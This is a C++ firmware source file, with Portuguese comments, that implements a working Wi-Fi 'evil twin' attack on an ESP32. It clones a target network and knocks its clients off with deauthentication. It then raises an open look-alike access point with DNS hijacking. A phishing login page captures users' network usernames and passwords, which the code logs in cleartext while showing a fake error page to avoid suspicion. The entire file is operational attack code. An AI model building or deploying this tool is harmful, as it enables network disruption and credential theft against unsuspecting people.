#include "evil_twin.h"
#include "deauth.h"
#include "definitions.h"
#include <SPIFFS.h>

// Estados globais
evil_twin_state_t evil_twin_mode = EVIL_TWIN_DISABLED;
target_network_t target_network;
DNSServer dns_server;
WebServer captive_server(8080); // Porta diferente para evitar conflito
captured_credentials_t captured_creds[MAX_CAPTURED_CREDS];
int captured_count = 0;

void init_evil_twin() {
    captured_count = 0;
    evil_twin_mode = EVIL_TWIN_DISABLED;
    DEBUG_PRINTLN("Evil Twin inicializado");
}

void start_evil_twin_attack(int network_index) {
    DEBUG_PRINTF("🎭 Iniciando Evil Twin Attack na rede %d\n", network_index);
    
    // 1. Copia dados da rede alvo
    clone_target_network(network_index);
    
    // 2. Inicia deauth na rede original
    evil_twin_mode = EVIL_TWIN_DEAUTHING;
    DEBUG_PRINTLN("🎯 Fase 1: Deautenticando clientes...");
    
    attack_deauth_single(network_index, 1); // Reason: Unspecified
    
    // 3. Aguarda desconexões (3 segundos)
    unsigned long start_time = millis();
    while (millis() - start_time < 3000) {
        // Continua processando deauth durante esse tempo
        delay(100);
    }
    
    // 4. Para deauth e inicia Evil Twin
    attack_stop();
    evil_twin_mode = EVIL_TWIN_ACTIVE;
    
    DEBUG_PRINTLN("🎭 Fase 2: Criando AP falso...");
    
    // 5. Reconfigura ESP32 como clone perfeito
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_AP);
    
    // Clona SSID e canal (sem senha para captive portal)
    WiFi.softAP(target_network.ssid, "", target_network.channel);
    esp_wifi_set_channel(target_network.channel, WIFI_SECOND_CHAN_NONE);
    
    // 6. Inicia captive portal
    start_captive_portal();
    
    DEBUG_PRINTF("✅ Evil Twin ativo: %s (Canal %d)\n", 
                  target_network.ssid, target_network.channel);
    DEBUG_PRINTF("📡 Captive Portal: %s:8080\n", WiFi.softAPIP().toString().c_str());
}

void clone_target_network(int network_index) {
    // Obtém dados da rede escaneada
    String ssid = WiFi.SSID(network_index);
    ssid.toCharArray(target_network.ssid, 33);
    
    target_network.channel = WiFi.channel(network_index);
    target_network.auth_mode = WiFi.encryptionType(network_index);
    target_network.rssi = WiFi.RSSI(network_index);
    
    uint8_t* bssid = WiFi.BSSID(network_index);
    if (bssid) {
        memcpy(target_network.bssid, bssid, 6);
    }
    
    target_network.selected = true;
    
    DEBUG_PRINTF("📋 Clonando rede: %s\n", target_network.ssid);
    DEBUG_PRINTF("📍 BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  target_network.bssid[0], target_network.bssid[1],
                  target_network.bssid[2], target_network.bssid[3], 
                  target_network.bssid[4], target_network.bssid[5]);
    DEBUG_PRINTF("📡 Canal: %d\n", target_network.channel);
}

void start_captive_portal() {
    // Configura handlers do captive portal
    setup_captive_portal_handlers();
    
    // Configura DNS server para redirecionar TUDO
    dns_server.start(53, "*", WiFi.softAPIP());
    
    // Inicia servidor captive
    captive_server.begin();
    
    evil_twin_mode = EVIL_TWIN_CAPTURING;
    DEBUG_PRINTLN("🕸️ Captive Portal ativo!");
}

void setup_captive_portal_handlers() {
    // Página de login falsa
    captive_server.on("/", []() {
        String html = generate_login_page();
        captive_server.send(200, "text/html", html);
        DEBUG_PRINTLN("📄 Página de login servida");
    });
    
    // Captura de credenciais
    captive_server.on("/login", HTTP_POST, []() {
        String username = captive_server.arg("username");
        String password = captive_server.arg("password");
        
        // Salva credenciais
        log_credentials(username.c_str(), password.c_str());
        
        // Simula erro de login para não levantar suspeitas
        String html = generate_error_page();
        captive_server.send(200, "text/html", html);
    });
    
    // Redireciona qualquer requisição para página de login
    captive_server.onNotFound([]() {
        captive_server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + ":8080");
        captive_server.send(302, "text/plain", "");
        DEBUG_PRINTLN("🔄 Redirecionamento captive portal");
    });
}

String generate_login_page() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <title>)" + String(target_network.ssid) + R"( - Autenticação WiFi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container { 
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .wifi-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 20px;
            background: #667eea;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 28px;
        }
        h2 { 
            color: #333;
            text-align: center;
            margin-bottom: 10px;
            font-weight: 600;
        }
        .network-info { 
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input[type="text"], input[type="password"] { 
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
            background: #fff;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        button { 
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: transform 0.2s ease;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
        }
        .security-notice {
            margin-top: 20px;
            padding: 15px;
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            font-size: 14px;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="wifi-icon">📶</div>
            <h2>Conectar à Rede WiFi</h2>
        </div>
        
        <div class="network-info">
            <strong>🔗 )" + String(target_network.ssid) + R"(</strong><br>
            <small>Autenticação de rede necessária</small>
        </div>
        
        <form action="/login" method="post">
            <div class="form-group">
                <label for="username">👤 Usuário da Rede:</label>
                <input type="text" id="username" name="username" placeholder="Digite seu usuário" required>
            </div>
            
            <div class="form-group">
                <label for="password">🔐 Senha da Rede:</label>
                <input type="password" id="password" name="password" placeholder="Digite sua senha" required>
            </div>
            
            <button type="submit">🚀 Conectar à Rede</button>
        </form>
        
        <div class="security-notice">
            ⚠️ <strong>Atenção:</strong> Esta rede requer autenticação adicional para garantir a segurança da conexão.
        </div>
    </div>
    
    <script>
        // Auto-focus no primeiro campo
        document.getElementById('username').focus();
    </script>
</body>
</html>
    )";
}

String generate_error_page() {
    return R"(
<!DOCTYPE html>
<html>
<head>
    <title>Erro de Autenticação</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="4;url=/">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .error-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 20px;
            background: #ff6b6b;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 28px;
        }
        h3 {
            color: #d63031;
            margin-bottom: 15px;
            font-weight: 600;
        }
        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        .countdown {
            color: #d63031;
            font-weight: 600;
        }
        .spinner {
            margin: 20px auto;
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #d63031;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-icon">❌</div>
        <h3>Erro de Autenticação</h3>
        <p>Credenciais inválidas ou rede temporariamente indisponível.</p>
        <p class="countdown">Redirecionando em <span id="countdown">4</span> segundos...</p>
        <div class="spinner"></div>
        <p><small>Verifique suas credenciais e tente novamente.</small></p>
    </div>
    
    <script>
        let seconds = 4;
        const countdownElement = document.getElementById('countdown');
        
        const timer = setInterval(() => {
            seconds--;
            countdownElement.textContent = seconds;
            
            if (seconds <= 0) {
                clearInterval(timer);
                window.location.href = '/';
            }
        }, 1000);
    </script>
</body>
</html>
    )";
}

void handle_evil_twin() {
    if (evil_twin_mode == EVIL_TWIN_CAPTURING) {
        // Processa requisições DNS
        dns_server.processNextRequest();
        
        // Processa requisições HTTP  
        captive_server.handleClient();
        
        // Pisca LED para indicar atividade
        static unsigned long last_blink = 0;
        if (millis() - last_blink > 2000) {
            BLINK_LED(1, 100);
            last_blink = millis();
        }
    }
}

void log_credentials(const char* username, const char* password) {
    if (captured_count < MAX_CAPTURED_CREDS) {
        strncpy(captured_creds[captured_count].username, username, 63);
        captured_creds[captured_count].username[63] = '\0';
        
        strncpy(captured_creds[captured_count].password, password, 63);
        captured_creds[captured_count].password[63] = '\0';
        
        captured_creds[captured_count].timestamp = millis();
        captured_count++;
        
        DEBUG_PRINTF("🎯 CREDENCIAL CAPTURADA #%d: [%s] / [%s]\n", 
                     captured_count, username, password);
        
        // Pisca LED rapidamente para indicar captura
        BLINK_LED(5, 100);
    } else {
        DEBUG_PRINTLN("⚠️ Buffer de credenciais cheio!");
    }
}

void stop_evil_twin() {
    DEBUG_PRINTLN("🛑 Parando Evil Twin Attack...");
    
    evil_twin_mode = EVIL_TWIN_DISABLED;
    dns_server.stop();
    captive_server.stop();

    // Back to a silent station: no SoftAP, so no beacons leave the board.
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();

    DEBUG_PRINTLN("✅ Evil Twin desativado");
    DEBUG_PRINTF("📊 Total de credenciais capturadas: %d\n", captured_count);
}
